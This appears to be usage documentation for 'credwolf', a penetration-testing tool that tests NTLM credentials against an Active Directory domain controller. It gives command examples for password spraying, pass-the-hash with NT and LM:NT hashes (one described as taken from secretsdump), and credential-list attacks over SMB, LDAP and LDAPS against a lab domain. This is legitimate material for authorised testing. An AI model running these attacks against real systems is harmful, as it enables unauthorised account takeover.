# NTLM

Test credentials over SMB (default), LDAP, or LDAPS. See the [CLI reference](../reference/cli.md) for all flags and the [error handling](../reference/error-handling.md) page for NTLM-specific error codes.

## Single user + single password

```bash
credwolf -d evil.corp ntlm --dc-ip 10.0.0.1 -u Administrator -p 'Password1!'
```

## Single user + inline hash

```bash
# NT format
credwolf -d evil.corp ntlm --dc-ip 10.0.0.1 -u Administrator --hash 7facdc498ed1680c4fd1448319a8c04f
# [+] evil.corp/Administrator:7facdc498ed1680c4fd1448319a8c04f@nt_hash

# LM:NT format (from secretsdump)
credwolf -d evil.corp ntlm --dc-ip 10.0.0.1 -u Administrator --hash 'aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f'
# [+] evil.corp/Administrator:7facdc498ed1680c4fd1448319a8c04f@nt_hash
```

## File-based

```bash
# User list + password list
credwolf -d evil.corp ntlm --dc-ip 10.0.0.1 -U users.txt -P passwords.txt

# Single user + hash file (NT hashes or LM:NT pairs, one per line)
credwolf -d evil.corp ntlm --dc-ip 10.0.0.1 -u Administrator -H hashes.txt

# User list + hash file
credwolf -d evil.corp ntlm --dc-ip 10.0.0.1 -U users.txt -H hashes.txt
```

## Paired files

```bash
# Pre-paired user:password file (one user:password per line)
credwolf -d evil.corp ntlm --dc-ip 10.0.0.1 --user-pass-file creds.txt

# Pre-paired user:hash file (one user:hash per line, NT or LM:NT format)
credwolf -d evil.corp ntlm --dc-ip 10.0.0.1 --user-hash-file creds.txt
```

## Transport options

```bash
# Use LDAP transport instead of SMB
credwolf -d evil.corp ntlm --dc-ip 10.0.0.1 -u Administrator --hash 7facdc498ed1680c4fd1448319a8c04f --transport ldap

# Use LDAPS transport
credwolf -d evil.corp ntlm --dc-ip 10.0.0.1 -u Administrator --hash 7facdc498ed1680c4fd1448319a8c04f --transport ldaps
```
